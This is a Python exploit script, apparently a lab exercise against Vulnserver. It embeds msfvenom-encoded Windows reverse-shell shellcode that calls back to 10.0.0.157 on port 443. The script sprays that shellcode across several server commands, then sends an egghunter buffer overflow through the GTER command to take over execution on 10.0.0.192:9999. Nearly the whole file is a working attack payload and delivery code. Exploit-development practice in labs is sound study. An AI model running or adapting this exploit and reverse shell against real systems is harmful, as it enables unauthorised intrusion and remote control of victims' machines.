#!/usr/bin/python3

import socket

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=10.0.0.157 LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -i 3 -b "\x00" -f python

buf =  b""
buf += b"\xd9\xe8\xd9\x74\x24\xf4\xbd\x33\x70\x7e\xaf\x58\x2b"
buf += b"\xc9\xb1\x5f\x31\x68\x19\x03\x68\x19\x83\xe8\xfc\xd1"
buf += b"\x85\xc0\xbb\x7d\xcc\x1e\x1e\xa9\xc9\x15\xba\xa5\xb1"
buf += b"\xfc\x0b\xf4\x1e\xce\xf8\xe3\x1d\xf3\xfb\x08\x51\xe5"
buf += b"\xe1\xef\x47\x02\xbf\x76\x50\x8c\x40\xc8\xdc\x9b\xca"
buf += b"\xe4\x67\x3f\xf7\x76\x31\xb0\x22\x65\xb1\x33\xf3\x21"
buf += b"\x16\x5a\x34\x80\xec\xe3\xb7\x50\x19\xf0\x59\xc2\x5e"
buf += b"\x81\x3c\xe3\x55\x02\x34\x1b\xba\x1a\x9b\x1c\x92\x20"
buf += b"\xd2\x9f\x7e\x12\x03\xcb\xd1\xcb\x95\x11\x45\x5f\x64"
buf += b"\x89\xf0\x34\xf5\xc6\x2d\xc2\xf9\x1a\xff\xd9\xdf\x1f"
buf += b"\xdb\x28\xe3\x58\x0e\xb1\x3d\x26\xc2\xef\xa7\x1e\x3a"
buf += b"\x6c\x0b\x23\x79\xae\x29\x07\x39\xc8\x4c\xf3\xb2\x3b"
buf += b"\x9c\x09\xb1\xd1\x07\x1c\x93\x36\x15\x1f\xe4\x19\x77"
buf += b"\xfa\x3b\x07\xda\xfa\xfb\x60\x56\x0d\x73\x71\x19\xf5"
buf += b"\x45\xc1\x13\x77\x3c\xad\x09\x23\x73\x7a\xde\x0e\xad"
buf += b"\xf2\xcc\xd4\x8a\x82\xbc\x67\x75\x3d\x20\x30\x93\x1b"
buf += b"\xea\xb7\x68\xe4\xcd\xd7\x7b\xe9\x2c\x89\x29\x48\x24"
buf += b"\x1d\x0b\x24\xd0\x8c\xd5\x01\x4c\x76\xdd\x51\xa2\x8a"
buf += b"\x16\xa1\x37\xea\xd1\x79\x8a\xb3\x20\x26\xa7\x83\xb3"
buf += b"\x22\x89\xc8\x5a\x5d\x4a\xcc\xe6\x09\x11\x1d\x7d\xba"
buf += b"\x7a\x83\xa0\x22\x98\xa7\xca\x35\x3b\x0c\x7f\x9b\x08"
buf += b"\x56\x4c\x0e\x5e\x7b\xfb\x26\x63\x93\x52\xed\x72\xfb"
buf += b"\x81\x8c\xf2\x47\xfd\x5f\x87\x36\x80\x6d\x8f\x03\x22"
buf += b"\x74\x61\x18\xaa\x6c\xd2\xdf\x54\xb8\x61\x68\xaf\x38"
buf += b"\x38\x13\x3f\x64\xe1\x97\x92\x65\x6d\x0a\x6c\x74\x1a"
buf += b"\x74\x3e\x42\xf8\xa7\x1a\xb7\x16\x8c\x44\xd6\x94\xf3"
buf += b"\x21\x86\x25\x78\xa8\xe7\xf9\x25\xf2\xfd\x03\xc0\x20"
buf += b"\xf6\xc6\xad\x60\x78\x98\x1a\x17\x4a\x65\x17\xb0\xff"
buf += b"\x1e\x4b\x9a\x4a\xe9\x91\xe2\x4e\x0e\xdc\x75\xd3\x0a"
buf += b"\x2a\xeb\x5e\x3b\x3c\x20\x91\x76\xe9\x47\xe5\xfb\xb1"
buf += b"\xc4\xee\x6d\x67\x2e\xe0\xb4\x34\xc6\x9b\x4d\x58\x87"
buf += b"\x74\x5f"

# Egg is H@CK, egghunter is 32 bytes total
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x48\x40\x43\x4b\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = b"\x90" * 40
buffer += egghunter
buffer += b"\x90" * (146 - 40 - len(egghunter))
buffer += b"\xC7\x11\x50\x62"
buffer += b"\xEB\x80"
buffer += b"\x90" * (200 - len(buffer))

# I tried using the GDOG command from the KSTET exploit, but my shellcode was not appearing in memory so I decided to spray it to all the commands I hadn't exploited.
# This will loop through all of the commands I haven't exploited and send the shellcode to all of them in the hopes that it will end up in memory somewhere.
# Following in a dubugger, the STATS command was shown to have placed my shellcode in memory to be found by my egghunter.
# This exploit does work, but I wrote a variation that just sends the STATS command and that one works as well.

for command in ["STATS ", "RTIME ", "LTIME ", "SRUN ", "HTER ", "LTER ", "KSTAN "]:
	print("Sending " + command + " command...")
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect(("10.0.0.192",9999))
	banner = s.recv(1024)
	print(banner.decode())

	egg = b"\x48\x40\x43\x4B"

	shellcode = command.encode() + bytearray(egg + egg + b"\x90" * 10 + buf)
	s.send(shellcode)
	response = s.recv(1024)
	print(response.decode())
	s.close()

# This is the actual exploit packet, intended to hijack EIP and redirect execution to egghunter, which will find our egg in memory and jmp to the shellcode succeeding it.

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.192",9999))
banner = s.recv(1024)
print(banner)

exploit = "GTER /.:/ ".encode() + bytearray(buffer) + "\r\n".encode()

s.send(exploit)
response = s.recv(1024)
print(response.decode())
s.close()
